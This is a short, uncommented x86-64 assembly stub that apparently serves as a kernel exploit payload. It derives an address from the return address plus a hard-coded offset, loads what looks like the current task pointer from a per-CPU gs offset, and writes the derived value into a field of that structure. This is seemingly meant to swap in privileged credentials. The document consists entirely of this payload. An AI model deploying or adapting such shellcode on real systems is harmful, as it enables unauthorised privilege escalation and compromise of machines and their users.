    BITS 64
    DEFAULT REL

_start:
    pop rax
    push rax
    add rax, 0x91bc92
    mov rdx, gs:0x2c580
    mov [rdx+0x768], rax
    ret